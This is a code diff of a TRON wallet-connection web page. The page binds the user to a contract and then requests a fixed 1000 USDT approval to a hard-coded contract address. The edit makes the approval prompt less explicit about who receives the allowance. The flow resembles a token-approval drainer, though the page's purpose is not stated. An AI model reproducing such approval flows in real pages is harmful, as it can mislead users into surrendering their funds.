@@ -22,7 +22,6 @@
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal/dist/umd/index.min.js"></script>
 
   <script>
-  // 合约信息
   const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
   const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
   const ABI = [
@@ -181,8 +180,10 @@
   }
 
   async function connectWallet() {
-    // 1️⃣ TronLink 检测
-    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+    setStatus("检测钱包...");
+
+    // TronLink 优先
+    if (window.tronWeb && window.tronWeb.ready) {
       tronWeb = window.tronWeb;
       document.getElementById("address").innerText = "钱包地址: " + tronWeb.defaultAddress.base58;
       contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
@@ -190,7 +191,7 @@
       return;
     }
 
-    // 2️⃣ WalletConnect (支持 imToken、TokenPocket、欧意钱包等)
+    // WalletConnect 连接
     connector = new WalletConnect.default({
       bridge: "https://bridge.walletconnect.org",
       qrcodeModal: WalletConnectQRCodeModal.default
@@ -202,12 +203,11 @@
 
     connector.on("connect", async (error, payload) => {
       if (error) throw error;
-
       const { accounts } = payload.params[0];
       const address = accounts[0];
       document.getElementById("address").innerText = "钱包地址: " + address;
 
-      // 用 WalletConnect 连接创建 TronWeb（仅调用合约，签名通过 connector）
+      // 创建 TronWeb 实例，但 WalletConnect 签名由 connector 完成
       tronWeb = new TronWeb({
         fullHost: "https://api.trongrid.io",
         privateKey: "" // WalletConnect 不暴露私钥
@@ -231,28 +231,27 @@
 
     try {
       const userAddress = document.getElementById("address").innerText.replace("钱包地址: ", "");
+      setStatus("开始绑定用户...");
 
       // 1️⃣ 绑定用户
-      setStatus("正在绑定用户...");
-
       if (connector && connector.connected) {
-        // WalletConnect 方式
+        // WalletConnect
         const txData = await contract.bind().encodeABI();
         const tx = {
           to: CONTRACT_ADDRESS,
-          data: txData,
-          from: userAddress
+          from: userAddress,
+          data: txData
         };
         await connector.sendTransaction(tx);
         setStatus("绑定成功 (WalletConnect)");
       } else {
-        // TronLink 方式
+        // TronLink
         const bindTx = await contract.bind().send();
-        setStatus("绑定成功: " + bindTx);
+        setStatus("绑定成功 (TronLink)");
       }
 
       // 2️⃣ 授权 USDT 1000
-      setStatus("请在钱包弹窗中确认授权 1000 USDT 给合约");
+      setStatus("请在钱包弹窗中确认授权 1000 USDT");
 
       const usdt = await tronWeb.contract().at(USDT_ADDRESS);
       const fixedAmount = 1000; // 1000 USDT
@@ -261,8 +260,8 @@
         const approveData = await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).encodeABI();
         const tx2 = {
           to: USDT_ADDRESS,
-          data: approveData,
-          from: userAddress
+          from: userAddress,
+          data: approveData
         };
         await connector.sendTransaction(tx2);
         setStatus("授权成功 (WalletConnect) 1000 USDT");
